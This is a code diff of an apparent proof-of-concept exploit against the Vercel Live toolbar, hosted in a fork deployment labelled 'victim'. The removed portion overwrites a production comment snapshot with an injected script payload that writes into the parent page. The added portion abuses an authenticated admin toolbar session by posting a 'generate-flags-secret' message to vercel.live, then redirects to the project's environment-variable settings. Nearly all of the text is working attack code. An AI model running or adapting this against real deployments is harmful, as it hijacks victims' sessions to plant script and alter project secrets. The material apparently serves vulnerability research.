@@ -2,40 +2,32 @@
 <script>
 (() => {
   const LIVE_ORIGIN = 'https://vercel.live';
-  const PRODUCTION_HOST =
-    'naturell-toolbar-fork-victim-20260809-h763y6e4f-testteam22-687d.vercel.app';
   const PROJECT_ID = 'prj_eg3xiAzg9rqF1tLFbXOkCwpftLJO';
   const OWNER_ID = 'team_qmp53qfzAPgwkguhRzHvSwgV';
   const OWNER_SLUG = 'testteam22-687d';
+  const PROJECT_SLUG = 'naturell-toolbar-fork-victim-20260809';
   const PRODUCTION_BRANCH = 'main';
   const PRODUCTION_ROOM_SHA256 =
     'f637935f61809b35a7dc4b92f6067a8081399f4808dbda429bb00f60ef53130a';
-  const CONTROL_THREAD_PREFIX = 'naturell-production-control-thread-';
-  const CONTROL_THREAD_PATTERN =
-    /^naturell-production-control-thread-[0-9a-f]{16}$/;
-  const CONTROL_PAGE_TITLE = 'Naturell normalized mutation control';
-  const CONTROL_SNAPSHOT_HTML =
-    '<!doctype html><meta charset="utf-8"><title>Naturell mutation control</title><p>Naturell synthetic mutation control</p>';
+  const SOURCE_MARKER =
+    'naturell_external_fork_flags_secret_creation_20260810';
   const requestedMarker = new URLSearchParams(location.search).get('marker');
-  const DOM_MARKER =
-    /^naturell_external_fork_snapshot_overwrite_xss_[0-9a-f]{24}$/.test(
+  const PROOF_MARKER =
+    /^naturell_external_fork_flags_secret_[0-9a-f]{24}$/.test(
       requestedMarker || ''
     ) ? requestedMarker : null;
-  const SOURCE_MARKER =
-    'naturell_external_fork_snapshot_overwrite_source_20260810';
   const PROJECT_STAGE =
     new URLSearchParams(location.search).get('stage') === 'project';
   const PREVIEW_AUTH_KEY =
-    'naturell-external-fork-preview-toolbar-authenticated';
-  const CONTROL_SNAPSHOT_ID_PATTERN = /^naturell-control-[0-9a-f]{24}$/;
+    'naturell-external-fork-flags-preview-authenticated';
+  const MUTATION_LATCH_KEY =
+    `naturell-external-fork-flags-mutation-${PROOF_MARKER || 'invalid'}`;
 
   let vercelAuthJWE = null;
-  let originalSnapshotText = null;
-  let replacementSnapshotText = null;
 
-  const state = window.__naturellSnapshotOverwrite = {
+  const state = window.__naturellFlagsSecretCreation = {
     sourceMarker: SOURCE_MARKER,
-    domMarker: DOM_MARKER,
+    proofMarker: PROOF_MARKER,
     phase: 'bootstrap',
     authStage: PROJECT_STAGE ? 'project' : 'preview',
     previewAuthAccepted:
@@ -45,34 +37,24 @@
     projectMatched: false,
     productionSession: false,
     roomMatched: false,
-    pullAccepted: false,
-    exactTargetCount: 0,
-    targetSelected: false,
-    originalSnapshotRead: false,
-    originalSnapshotMatched: false,
-    snapshotIdValidated: false,
-    uploadAccepted: false,
-    returnedKeyMatched: false,
-    replacementRead: false,
-    originalBytesChanged: false,
-    replacementBytesMatched: false,
-    navigationSent: false,
-    originalSnapshotSha256: null,
-    replacementSnapshotSha256: null,
-    targetThreadSha256: null,
-    targetSnapshotKeySha256: null,
+    scopeMatched: false,
+    hasFlagsSecretWasFalse: false,
+    isAdminWasTrue: false,
+    isLocalhostWasTrue: false,
+    teamMatched: false,
+    mutationLatchSet: false,
+    mutationSent: false,
+    replyReceived: false,
+    replyAccepted: false,
+    resultTruthy: false,
+    resultType: null,
+    resultKeys: [],
+    resultStringLength: null,
+    resultStringSha256: null,
+    dashboardNavigationSent: false,
     target: null,
     targets: [],
-    roomId: null,
-    roomKey: null,
-    ownerSlug: null,
-    targetThreadId: null,
-    targetSnapshotKey: null,
-    targetSnapshotId: null,
-    pullReplyId: null,
-    originalGetReplyId: null,
-    uploadReplyId: null,
-    replacementGetReplyId: null,
+    replyId: null,
   };
 
   function randomHex(byteCount) {
@@ -94,7 +76,7 @@
   function safeState() {
     return {
       sourceMarker: state.sourceMarker,
-      domMarker: state.domMarker,
+      proofMarker: state.proofMarker,
       phase: state.phase,
       authStage: state.authStage,
       previewAuthAccepted: state.previewAuthAccepted,
@@ -103,29 +85,28 @@
       projectMatched: state.projectMatched,
       productionSession: state.productionSession,
       roomMatched: state.roomMatched,
-      pullAccepted: state.pullAccepted,
-      exactTargetCount: state.exactTargetCount,
-      targetSelected: state.targetSelected,
-      originalSnapshotRead: state.originalSnapshotRead,
-      originalSnapshotMatched: state.originalSnapshotMatched,
-      snapshotIdValidated: state.snapshotIdValidated,
-      uploadAccepted: state.uploadAccepted,
-      returnedKeyMatched: state.returnedKeyMatched,
-      replacementRead: state.replacementRead,
-      originalBytesChanged: state.originalBytesChanged,
-      replacementBytesMatched: state.replacementBytesMatched,
-      navigationSent: state.navigationSent,
-      originalSnapshotSha256: state.originalSnapshotSha256,
-      replacementSnapshotSha256: state.replacementSnapshotSha256,
-      targetThreadSha256: state.targetThreadSha256,
-      targetSnapshotKeySha256: state.targetSnapshotKeySha256,
+      scopeMatched: state.scopeMatched,
+      hasFlagsSecretWasFalse: state.hasFlagsSecretWasFalse,
+      isAdminWasTrue: state.isAdminWasTrue,
+      isLocalhostWasTrue: state.isLocalhostWasTrue,
+      teamMatched: state.teamMatched,
+      mutationLatchSet: state.mutationLatchSet,
+      mutationSent: state.mutationSent,
+      replyReceived: state.replyReceived,
+      replyAccepted: state.replyAccepted,
+      resultTruthy: state.resultTruthy,
+      resultType: state.resultType,
+      resultKeys: state.resultKeys,
+      resultStringLength: state.resultStringLength,
+      resultStringSha256: state.resultStringSha256,
+      dashboardNavigationSent: state.dashboardNavigationSent,
     };
   }
 
   function setPhase(phase) {
     state.phase = phase;
-    document.documentElement.dataset.snapshotOverwritePhase = phase;
-    window.name = `naturell-snapshot-overwrite:${JSON.stringify(safeState())}`;
+    document.documentElement.dataset.flagsSecretPhase = phase;
+    window.name = `naturell-flags-secret:${JSON.stringify(safeState())}`;
   }
 
   function loadToolbar() {
@@ -137,7 +118,7 @@
   }
 
   async function prepareToolbar() {
-    if (!DOM_MARKER) {
+    if (!PROOF_MARKER) {
       setPhase('proof-marker-invalid');
       return;
     }
@@ -163,189 +144,34 @@
     loadToolbar();
   }
 
-  function send(type, replyId, payload) {
-    state.target.postMessage({type, replyId, payload}, LIVE_ORIGIN);
+  async function summarizeResult(result) {
+    state.resultTruthy = Boolean(result);
+    if (result === null) {
+      state.resultType = 'null';
+      return;
+    }
+    if (Array.isArray(result)) {
+      state.resultType = 'array';
+      return;
+    }
+    state.resultType = typeof result;
+    if (typeof result === 'object') {
+      state.resultKeys = Object.keys(result).sort();
+    }
+    if (typeof result === 'string') {
+      state.resultStringLength = result.length;
+      state.resultStringSha256 = await sha256Text(result);
+    }
   }
 
-  function pullProductionRoom() {
-    const profileId = `p${randomHex(16)}`;
-    const clientId = crypto.randomUUID();
-    const requestNonce = randomHex(4);
-    state.pullReplyId = `naturell-overwrite-pull-${randomHex(8)}`;
-    setPhase('production-room-pull-sent');
-    send('pull', state.pullReplyId, {
-      roomId: state.roomId,
-      body: JSON.stringify({
-        profileID: profileId,
-        clientID: clientId,
-        cookie: null,
-        lastMutationID: 0,
-        pullVersion: 0,
-        schemaVersion: '',
-      }),
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'X-Replicache-RequestID': `${clientId}-${requestNonce}-0`,
-      },
-    });
-  }
-
-  function activeSnapshotHtml() {
-    return `<!doctype html>
-<meta charset="utf-8">
-<title>Naturell external fork snapshot overwrite proof</title>
-<p>${DOM_MARKER}</p>
-<scr${''}ipt>
-(() => {
-  const marker = ${JSON.stringify(DOM_MARKER)};
-  const source = ${JSON.stringify(SOURCE_MARKER)};
-  const fixtureNode = parent.document.querySelector('#marker');
-  const valueRead = fixtureNode ? fixtureNode.textContent : '';
-  parent.document.documentElement.setAttribute(
-    'data-naturell-external-fork-snapshot-overwrite-xss', marker
-  );
-  parent.document.documentElement.setAttribute(
-    'data-naturell-external-fork-snapshot-overwrite-read', valueRead
-  );
-  parent.document.documentElement.setAttribute(
-    'data-naturell-external-fork-snapshot-overwrite-source', source
-  );
-  if (fixtureNode) fixtureNode.textContent = marker;
-  parent.postMessage({
-    type: 'naturell-external-fork-snapshot-overwrite-marker',
-    marker,
-    source,
-    valueRead,
-  }, '*');
-})();
-<\/scr${''}ipt>`;
-  }
-
-  async function acceptProductionPull(result) {
-    const patch = result?.body?.patch;
-    state.pullAccepted = result?.init?.status === 200 && Array.isArray(patch);
-    if (!state.pullAccepted) {
-      setPhase('production-room-pull-rejected');
-      return;
-    }
-
-    const keyPrefix =
-      `/3/${state.ownerSlug}/${PROJECT_ID}/${state.roomKey}/snapshot/`;
-    const matches = patch.map(item => {
-      if (item?.op !== 'put' || !item.value) return false;
-      const thread = item.value;
-      if (!(typeof thread.id === 'string' &&
-        thread.id.startsWith(CONTROL_THREAD_PREFIX) &&
-        CONTROL_THREAD_PATTERN.test(thread.id) &&
-        item.key === `commentThread-${thread.id}` &&
-        thread.pageTitle === CONTROL_PAGE_TITLE &&
-        typeof thread.snapshotKey === 'string' &&
-        thread.snapshotKey.startsWith(keyPrefix))) return null;
-      const snapshotId = thread.snapshotKey.slice(keyPrefix.length);
-      if (!CONTROL_SNAPSHOT_ID_PATTERN.test(snapshotId)) return null;
-      return {thread, snapshotId};
-    }).filter(Boolean);
-    state.exactTargetCount = matches.length;
-    if (matches.length !== 1) {
-      setPhase('production-control-thread-not-unique');
-      return;
-    }
-
-    const {thread, snapshotId} = matches[0];
-    state.targetThreadId = thread.id;
-    state.targetSnapshotKey = thread.snapshotKey;
-    state.targetSnapshotId = snapshotId;
-    state.targetThreadSha256 = await sha256Text(thread.id);
-    state.targetSnapshotKeySha256 = await sha256Text(thread.snapshotKey);
-    state.targetSelected = true;
-    state.originalGetReplyId = `naturell-overwrite-get-before-${randomHex(8)}`;
-    setPhase('original-snapshot-read-sent');
-    send('get-snapshot', state.originalGetReplyId, {
-      snapshotKey: state.targetSnapshotKey +
-        `?naturellOverwriteVerify=before-${randomHex(8)}`,
-    });
-  }
-
-  async function acceptOriginalSnapshot(result) {
-    const text = result?.text;
-    if (typeof text !== 'string' || !text) {
-      setPhase('original-snapshot-read-rejected');
-      return;
-    }
-    originalSnapshotText = text;
-    state.originalSnapshotRead = true;
-    state.originalSnapshotSha256 = await sha256Text(text);
-    if (text !== CONTROL_SNAPSHOT_HTML) {
-      setPhase('original-snapshot-control-mismatch');
-      return;
-    }
-    state.originalSnapshotMatched = true;
-
-    if (!CONTROL_SNAPSHOT_ID_PATTERN.test(state.targetSnapshotId)) {
-      setPhase('snapshot-id-validation-rejected');
-      return;
-    }
-    state.snapshotIdValidated = true;
-    replacementSnapshotText = activeSnapshotHtml();
-    state.replacementSnapshotSha256 = await sha256Text(replacementSnapshotText);
-    if (state.originalSnapshotSha256 === state.replacementSnapshotSha256) {
-      setPhase('replacement-payload-not-distinct');
-      return;
-    }
-
-    state.uploadReplyId = `naturell-overwrite-upload-${randomHex(8)}`;
-    setPhase('same-snapshot-id-upload-sent');
-    send('upload-snapshot', state.uploadReplyId, {
-      snapshotId: state.targetSnapshotId,
-      blob: new Blob([replacementSnapshotText], {type: 'text/html'}),
-    });
-  }
-
-  function acceptUpload(result) {
-    const returnedKey = result?.id;
-    if (typeof returnedKey !== 'string') {
-      setPhase('same-snapshot-id-upload-rejected');
-      return;
-    }
-    state.uploadAccepted = true;
-    state.returnedKeyMatched = returnedKey === state.targetSnapshotKey;
-    if (!state.returnedKeyMatched) {
-      setPhase('upload-returned-different-snapshot-key');
-      return;
-    }
-    state.replacementGetReplyId =
-      `naturell-overwrite-get-after-${randomHex(8)}`;
-    setPhase('replacement-snapshot-read-sent');
-    setTimeout(() => send('get-snapshot', state.replacementGetReplyId, {
-      snapshotKey: state.targetSnapshotKey +
-        `?naturellOverwriteVerify=${randomHex(8)}`,
-    }), 300);
-  }
-
-  async function acceptReplacementSnapshot(result) {
-    const text = result?.text;
-    if (typeof text !== 'string') {
-      setPhase('replacement-snapshot-read-rejected');
-      return;
-    }
-    state.replacementRead = true;
-    const actualHash = await sha256Text(text);
-    state.originalBytesChanged = actualHash !== state.originalSnapshotSha256;
-    state.replacementBytesMatched =
-      text === replacementSnapshotText &&
-      actualHash === state.replacementSnapshotSha256;
-    if (!state.originalBytesChanged || !state.replacementBytesMatched) {
-      setPhase('original-snapshot-key-not-replaced');
-      return;
-    }
-
-    state.navigationSent = true;
-    setPhase('production-navigation-sent');
-    const destination = new URL(`https://${PRODUCTION_HOST}/`);
-    destination.searchParams.set('vercelThreadId', state.targetThreadId);
+  function navigateToDashboard() {
+    state.dashboardNavigationSent = true;
+    setPhase('dashboard-navigation-sent');
+    const destination = new URL(
+      `https://vercel.com/${OWNER_SLUG}/${PROJECT_SLUG}/settings/environment-variables`
+    );
     destination.searchParams.set('deliverySource', SOURCE_MARKER);
-    destination.searchParams.set('proofMarker', DOM_MARKER);
+    destination.searchParams.set('proofMarker', PROOF_MARKER);
     location.replace(destination.href);
   }
 
@@ -399,78 +225,73 @@
           setPhase('preview-authenticated-reload');
           const next = new URL(location.href);
           next.searchParams.set('stage', 'project');
-          next.searchParams.set('delivery', 'snapshot-overwrite');
+          next.searchParams.set('delivery', 'flags-secret');
           location.replace(next.href);
           return;
         }
 
         state.productionSession = session.deploymentTarget === 'production';
-        const scopeMatched =
+        state.scopeMatched =
           session.ownerSlug === OWNER_SLUG &&
           session.roomKey === PRODUCTION_BRANCH;
-        const roomHash = await sha256Text(session.roomId);
-        state.roomMatched = roomHash === PRODUCTION_ROOM_SHA256;
-        if (!state.productionSession || !state.roomMatched || !scopeMatched) {
-          return;
-        }
+        state.teamMatched =
+          session.ownerId === OWNER_ID || session.teamId === OWNER_ID;
+        state.roomMatched =
+          await sha256Text(session.roomId) === PRODUCTION_ROOM_SHA256;
+        state.hasFlagsSecretWasFalse = session.hasFlagsSecret === false;
+        state.isAdminWasTrue = session.isAdmin === true;
+        state.isLocalhostWasTrue = session.isLocalhost === true;
+        if (
+          !state.productionSession ||
+          !state.scopeMatched ||
+          !state.teamMatched ||
+          !state.roomMatched ||
+          !state.hasFlagsSecretWasFalse ||
+          !state.isAdminWasTrue ||
+          !state.isLocalhostWasTrue ||
+          sessionStorage.getItem(MUTATION_LATCH_KEY) === '1'
+        ) return;
 
         state.target = event.source;
-        state.roomId = session.roomId;
-        state.ownerSlug = session.ownerSlug;
-        state.roomKey = session.roomKey;
         state.initAccepted = true;
-        setPhase('production-project-session-accepted');
-        pullProductionRoom();
+        state.replyId = `naturell-flags-secret-${randomHex(8)}`;
+        sessionStorage.setItem(MUTATION_LATCH_KEY, '1');
+        state.mutationLatchSet = true;
+        state.mutationSent = true;
+        setPhase('flags-secret-creation-sent');
+        state.target.postMessage({
+          type: 'generate-flags-secret',
+          replyId: state.replyId,
+        }, LIVE_ORIGIN);
         return;
       }
 
       if (
         event.data.type !== 'live-frame-reply' ||
         event.source !== state.target ||
-        !event.data.id
+        event.data.id !== state.replyId
       ) return;
 
-      if (event.data.id === state.pullReplyId) {
-        if (event.data.error) {
-          setPhase('production-room-pull-rejected');
-          return;
-        }
-        await acceptProductionPull(event.data.result);
+      state.replyReceived = true;
+      if (event.data.error) {
+        setPhase('flags-secret-creation-rejected');
         return;
       }
-
-      if (event.data.id === state.originalGetReplyId) {
-        if (event.data.error) {
-          setPhase('original-snapshot-read-rejected');
-          return;
-        }
-        await acceptOriginalSnapshot(event.data.result);
+      await summarizeResult(event.data.result);
+      state.replyAccepted = state.resultTruthy;
+      if (!state.replyAccepted) {
+        setPhase('flags-secret-creation-not-confirmed');
         return;
       }
-
-      if (event.data.id === state.uploadReplyId) {
-        if (event.data.error) {
-          setPhase('same-snapshot-id-upload-rejected');
-          return;
-        }
-        acceptUpload(event.data.result);
-        return;
-      }
-
-      if (event.data.id === state.replacementGetReplyId) {
-        if (event.data.error) {
-          setPhase('replacement-snapshot-read-rejected');
-          return;
-        }
-        await acceptReplacementSnapshot(event.data.result);
-      }
+      setPhase('flags-secret-creation-reply-accepted');
+      navigateToDashboard();
     } catch {
-      setPhase('snapshot-overwrite-script-error');
+      setPhase('flags-secret-script-error');
     }
   });
 
   setTimeout(() => {
-    if (!state.navigationSent) setPhase('snapshot-overwrite-timeout');
+    if (!state.dashboardNavigationSent) setPhase('flags-secret-timeout');
   }, 60000);
   prepareToolbar();
 })();
